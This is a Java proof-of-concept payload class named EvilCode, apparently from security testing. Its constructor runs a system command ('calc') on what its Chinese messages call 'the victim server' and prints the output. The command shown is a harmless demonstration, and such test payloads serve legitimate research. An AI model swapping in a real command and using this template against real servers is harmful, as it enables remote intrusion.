package com.wwh.security.test;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class EvilCode {
    public EvilCode() {
        System.out.println("在受害服务器上执行命令");
        Process p;
        String[] cmd = { "calc" };
        try {
            p = Runtime.getRuntime().exec(cmd);
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            while ((line = br.readLine()) != null) {
                System.out.println(line);
            }
            System.out.println("命令执行完毕");

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        EvilCode evilcode = new EvilCode();
    }

}
